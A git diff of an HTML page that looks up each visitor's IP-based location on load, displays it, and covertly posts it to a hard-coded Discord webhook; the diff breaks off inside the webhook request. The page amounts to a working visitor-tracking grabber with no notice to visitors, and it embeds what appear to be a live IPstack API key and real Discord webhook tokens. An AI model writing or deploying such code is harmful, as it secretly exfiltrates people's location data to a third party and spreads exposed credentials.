@@ -3,46 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>test</title>
+    <title>Street-Level Location Display</title>
 </head>
 <body>
 
-<p id="currentLocation">Fetching location...</p>
+<p id="locationDetails">Fetching location...</p>
 
 <script>
-   
-    fetch('https://ipinfo.io/json')
+    // Replace 'YOUR_IPSTACK_ACCESS_KEY' with your actual IPstack API access key
+    const ipstackAccessKey = 'aec2018fc9851eced8e0df13e01ac376';
+
+    // Use IPstack to get approximate location based on the user's IP address
+    fetch(`http://api.ipstack.com/check?access_key=${ipstackAccessKey}`)
         .then(response => response.json())
         .then(data => {
-            
+            // Extract location information from the response
             var city = data.city;
-            var region = data.region;
-            var country = data.country;
-            var street = data.street; 
-            var ip = data.ip; 
+            var region = data.region_name;
+            var country = data.country_name;
+            var street = data.street;
 
-            
-            var locationDetails = `IP: ${ip}, Location: ${city}, ${region}, ${country}.`;
+            // Display the location details in the HTML element with id "locationDetails"
+            var locationDetails = `Location: ${city}, ${region}, ${country}.`;
 
-            
+            // Add street information if available
             if (street) {
                 locationDetails += ` Street: ${street}`;
             }
 
-            document.getElementById("currentLocation").innerHTML = locationDetails;
+            document.getElementById("locationDetails").innerHTML = locationDetails;
 
-            
+            // Send the location details to Discord webhook
             sendToDiscordWebhook(locationDetails);
         })
         .catch(error => {
             console.error('Error fetching location:', error);
-            document.getElementById("currentLocation").innerHTML = "Error fetching location.";
+            document.getElementById("locationDetails").innerHTML = "Error fetching location.";
         });
 
-    
+    // Function to send a message to the Discord webhook
     function sendToDiscordWebhook(message) {
-        
-        const webhookUrl = 'https://discord.com/api/webhooks/1176553980223041556/GnQcvLQUmAkaBWuhUeoH8BAE3R7XDm389C44AxDeVSTgoQXUCy2YI-k6FTKCIAO-OR2o';
+        // Replace 'YOUR_DISCORD_WEBHOOK_URL' with the actual URL of your Discord webhook
+        const webhookUrl = 'https://discord.com/api/webhooks/1176560019613950063/C9xI7CjP9o3CQbhTTYzeHz8sOxxhSS1_gwaag9-cOXkQoNJ-KJ_SoXu7MQGXYIcOfj7J';
 
         fetch(webhookUrl, {
             method: 'POST',
